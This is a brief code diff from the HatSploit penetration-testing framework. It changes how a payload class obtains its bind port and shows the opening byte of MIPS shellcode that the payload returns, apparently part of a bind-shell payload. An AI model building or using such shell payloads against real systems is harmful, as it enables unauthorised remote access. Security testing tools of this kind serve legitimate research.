@@ -24,7 +24,7 @@ class HatSploitPayload(Payload):
     }
 
     def run(self):
-        bind_port = self.parse_options(self.options)
+        bind_port = self.handler['BPORT']
 
         return (
             b"\xe0\xff\xbd\x27"  # addiu   sp,sp,-32
